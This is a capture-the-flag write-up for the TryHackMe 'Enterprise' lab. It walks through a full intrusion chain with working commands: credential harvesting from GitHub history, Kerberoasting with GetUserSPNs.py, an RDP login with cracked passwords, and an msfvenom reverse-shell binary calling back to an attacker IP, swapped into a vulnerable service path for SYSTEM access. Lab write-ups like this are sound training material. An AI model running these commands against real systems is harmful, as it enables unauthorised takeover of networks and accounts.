# Enterprise -- TryHackMe (write-up)

**Difficulty:** Medium
**Box:** Enterprise (TryHackMe)
**Author:** dkrxhn
**Date:** 2025-01-22

---

## TL;DR

### Found creds via GitHub commit history and an Excel file with strings. Kerberoasted a service account, cracked it, RDP'd in, found an unquoted/writable service path via WinPEAS, replaced the binary with a reverse shell for SYSTEM.
---
## Target info

- Host: `10.10.0.36`
- Domain: `lab.enterprise.thm`
---
## Enumeration

![Nmap results](images/enterprise-thm_1.png)

![Nmap continued](images/enterprise-thm_2.png)

![Web enumeration](images/enterprise-thm_3.png)

![Web continued](images/enterprise-thm_4.png)

![More enumeration](images/enterprise-thm_5.png)

![Enumeration continued](images/enterprise-thm_6.png)

Found an xlsx file -- ran strings on it:

```bash
strings xlsx
```

![Strings output](images/enterprise-thm_7.png)

![Strings continued](images/enterprise-thm_8.png)

---
## GitHub OSINT

GitHub was the hint -- git-dumper **did not** return anything but searching GitHub did.

![GitHub search](images/enterprise-thm_12.png)

Found the enterprise-thm account on GitHub. Checked people listed:

![GitHub people](images/enterprise-thm_10.png)

![GitHub repo](images/enterprise-thm_11.png)

Checked commit history for first commit:

![GitHub commit history](images/enterprise-thm_13.png)

![First commit creds](images/enterprise-thm_14.png)

Found: `nik:ToastyBoi!`

---
## More credentials

![LDAP/SMB enumeration](images/enterprise-thm_15.png)

Found: `contractor-temp:Password123!`

---
## Kerberoasting

```bash
GetUserSPNs.py lab.enterprise.thm/nik:'ToastyBoi!' -k -dc-ip 10.10.0.36 -request
```

![Kerberoast hash](images/enterprise-thm_16.png)

![Hashcat cracked](images/enterprise-thm_17.png)

`bitbucket:littleredbucket`

---
## RDP and service exploitation

![RDP access](images/enterprise-thm_18.png)

```bash
xfreerdp /u:bitbucket /p:'littleredbucket' /v:10.10.0.36 /drive:myfiles,/home/daniel/Documents
```

![RDP session](images/enterprise-thm_19.png)

Ran WinPEAS:

```powershell
.\winPEAS.ps1
```

![WinPEAS output](images/enterprise-thm_20.png)

Found a vulnerable service path. Generated a reverse shell binary:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.90.250 LPORT=1234 -f exe -o service.exe
```

![Msfvenom output](images/enterprise-thm_21.png)

Uploaded and renamed to ZeroTier.exe, placed in the service filepath.

```powershell
net start zerotieroneservice
```

![Service started](images/enterprise-thm_22.png)

![SYSTEM shell](images/enterprise-thm_23.png)

![Flag](images/enterprise-thm_24.png)

---
## Lessons & takeaways

- GitHub OSINT: check commit history for hardcoded creds that were "removed" in later commits
- Kerberoasting with valid domain creds is always worth running
- WinPEAS finds writable/unquoted service paths -- replace the binary for SYSTEM
- `xfreerdp` with `/drive` flag makes file transfer easy during RDP sessions
